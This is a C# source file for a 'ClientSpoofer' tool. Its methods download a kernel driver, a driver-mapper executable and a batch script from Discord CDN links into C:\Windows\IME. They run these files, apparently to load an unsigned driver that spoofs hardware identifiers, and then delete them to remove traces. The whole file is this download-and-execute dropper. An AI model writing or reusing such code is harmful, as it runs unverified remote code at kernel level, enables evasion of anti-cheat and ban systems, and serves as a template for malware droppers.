using System.Diagnostics;
using System.Net;
using System.Threading;

namespace ClientSpoofer
{
    internal class Spoofer
    {
        public static void Spoof()
        {
            WebClient webClient = new WebClient();
            string str1 = "C:\\Windows\\IME\\mapper.exe";
            string str2 = "C:\\Windows\\IME\\spoof.sys";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/651522382200176690/660983927883825163/spoofer.sys", str2);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/651522382200176690/660984792061313024/mapper_3.exe", str1);
            Process process1 = new Process()
            {
                StartInfo = {
          FileName = "cmd.exe",
          UseShellExecute = true,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        }
            };
            Process process2 = Process.Start(str1, str2);
            Thread.Sleep(1000);
            process2.Close();
            System.IO.File.Delete(str2);
            System.IO.File.Delete(str1);
        }

        public static void Clean()
        {
            WebClient webClient = new WebClient();
            string str = "C:\\Windows\\IME\\Run_me.bat";
            string fileName = str;
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/727855516965011548/731227744750272623/Run_me.bat", fileName);
            Process process1 = new Process()
            {
                StartInfo = {
          FileName = "cmd.exe",
          UseShellExecute = true,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        }
            };
            Process process2 = Process.Start(str);
            Thread.Sleep(1000);
            process2.Close();
            System.IO.File.Delete(str);
        }
    }
}
